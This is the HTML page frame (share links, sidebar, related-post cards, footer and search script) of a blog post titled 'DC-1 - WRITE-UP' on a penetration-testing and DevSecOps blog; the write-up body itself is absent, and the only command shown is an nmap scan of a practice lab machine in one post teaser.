href="https://telegram.me/share?text=DC-1 - WRITE-UP - Cloufish's Blog&url=https://cloufish.github.io/blog/posts/dc1-en/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/blog/posts/Can-OWASP-ZAP-replace-Burp-Suite-Professional/">Can OWASP ZAP replace Burp Suite Professional?</a><li><a href="/blog/posts/OWASP-ZAP-as-a-great-fuzzing-tool/">OWASP-ZAP-Fuzzer is it a great alternative for Burp-Suite Intruder?</a><li><a href="/blog/posts/Setting-up-zap-scan-in-cicd-pipeline/">Setting up ZAP Scan in CI/CD pipeline</a><li><a href="/blog/posts/Setting-Up-Hashicorp-Vault-To-Manage-Github-Token/">Setting up Hashicorp Vault to manage our Github Token</a><li><a href="/blog/posts/Preventing-Insufficient-Logging-and-Monitoring/">Concept of Preventing Insufficient Logging & Monitoring</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/blog/tags/devsecops/">devsecops</a> <a class="post-tag" href="/blog/tags/beginner/">beginner</a> <a class="post-tag" href="/blog/tags/containers/">containers</a> <a class="post-tag" href="/blog/tags/docker/">docker</a> <a class="post-tag" href="/blog/tags/blog/">blog</a> <a class="post-tag" href="/blog/tags/cms/">cms</a> <a class="post-tag" href="/blog/tags/kubernetes/">kubernetes</a> <a class="post-tag" href="/blog/tags/owasp/">owasp</a> <a class="post-tag" href="/blog/tags/pentesting-lab/">pentesting lab</a> <a class="post-tag" href="/blog/tags/zaproxy/">zaproxy</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/blog/posts/dc3-en/"><div class="card-body"> <span class="timeago small" > Jun 8, 2020 <i class="unloaded">2020-06-08T09:46:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>DC-3 - WRITE-UP</h3><div class="text-muted small"><p> MAIN INFORMATION BOX NAME: DC: 3.2 DESCRIPTION 1 2 3 4 5 6 7 8 9 10 11 DC-3 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing. As ...</p></div></div></a></div><div class="card"> <a href="/blog/posts/dc4-en/"><div class="card-body"> <span class="timeago small" > Jun 9, 2020 <i class="unloaded">2020-06-09T09:46:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>DC-4 - WRITE-UP</h3><div class="text-muted small"><p> MAIN INFORMATION BOX NAME: DC: 4 DESCRIPTION 1 2 3 4 5 6 7 DC-4 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing. Unlike the pre...</p></div></div></a></div><div class="card"> <a href="/blog/posts/basic_pentesting/"><div class="card-body"> <span class="timeago small" > Jan 23 <i class="unloaded">2021-01-23T08:46:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TryHackMe - Basic Pentesting WRITE-UP</h3><div class="text-muted small"><p> BOX NAME: Basic Pentesting NMAP $ nmap -T4 -A -p- -Pn -oG nmap-grepable.txt 10.10.31.163 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/blog/posts/dmv1-en/" class="btn btn-outline-primary" prompt="Older"><p>DMV:1 - WRITE-UP</p></a> <a href="/blog/posts/dc3-en/" class="btn btn-outline-primary" prompt="Newer"><p>DC-3 - WRITE-UP</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/cloufisz">Bartholomew Mokrzycki</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/blog/tags/devsecops/">devsecops</a> <a class="post-tag" href="/blog/tags/beginner/">beginner</a> <a class="post-tag" href="/blog/tags/containers/">containers</a> <a class="post-tag" href="/blog/tags/docker/">docker</a> <a class="post-tag" href="/blog/tags/blog/">blog</a> <a class="post-tag" href="/blog/tags/cms/">cms</a> <a class="post-tag" href="/blog/tags/kubernetes/">kubernetes</a> <a class="post-tag" href="/blog/tags/owasp/">owasp</a> <a class="post-tag" href="/blog/tags/pentesting-lab/">pentesting lab</a> <a class="post-tag" href="/blog/tags/zaproxy/">zaproxy</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/blog/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://cloufish.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
